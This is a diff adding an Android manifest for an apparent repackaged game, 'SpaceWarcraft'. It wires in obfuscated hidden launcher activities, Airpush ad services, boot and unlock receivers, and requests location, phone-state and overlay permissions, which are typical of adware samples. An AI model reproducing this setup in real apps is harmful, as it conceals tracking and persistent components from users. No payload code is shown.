@@ -1,0 +1,53 @@
+<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" android:installLocation="preferExternal" package="com.tgmrinwj.cjiegmqopwgkrfb.cqhifimkvldwq">
+    <supports-screens android:anyDensity="false"/>
+    <application android:debuggable="false" android:icon="@drawable/launchericon" android:label="@string/app_name" android:screenOrientation="portrait">
+        <activity android:label="@string/app_name" android:name="com.tgmrinwj.cjiegmqopwgkrfb.cqhifimkvldwq.SpaceWarcraft" android:screenOrientation="portrait">
+            <intent-filter/>
+        </activity>
+        <activity android:configChanges="keyboard|keyboardHidden|orientation" android:name="com.google.ads.AdActivity"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:name="com.airpush.android.PushAds"/>
+        <receiver android:name="com.airpush.android.UserDetailsReceiver"/>
+        <receiver android:name="com.airpush.android.MessageReceiver"/>
+        <receiver android:name="com.airpush.android.DeliveryReceiver"/>
+        <receiver android:name="com.tgmrinwj.cjiegmqopwgkrfb.cqhifimkvldwq.BootReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <category android:name="android.intent.category.HOME"/>
+            </intent-filter>
+        </receiver>
+        <service android:name="com.airpush.android.PushService">
+            <intent-filter>
+                <action android:name="com.airpush.android.PushServiceStart14342"/>
+            </intent-filter>
+        </service>
+        <meta-data android:name="np_app_key" android:value="100514950"/>
+        <activity android:excludeFromRecents="true" android:name="com.FkLWKtMC.TacUDekenMNC">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity>
+        <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:name="com.FkLWKtMC.EfhCdluTkvoEsa"/>
+        <activity android:excludeFromRecents="true" android:name="com.FkLWKtMC.QGaMmrUhd"/>
+        <service android:name="com.FkLWKtMC.BDoWuFdqIfmVo"/>
+        <service android:name="com.FkLWKtMC.tSppnJTqPh"/>
+        <receiver android:name="com.FkLWKtMC.GUwsUhEcKB"/>
+        <receiver android:name="com.FkLWKtMC.userPermissionReceiver">
+            <intent-filter android:priority="90000">
+                <action android:name="android.intent.action.USER_PRESENT"/>
+            </intent-filter>
+        </receiver>
+    </application>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.VIBRATE"/>
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+    <uses-permission android:name="android.permission.GET_TASKS"/>
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="com.android.launcher.permission.INSTALL_SHORTCUT"/>
+</manifest>
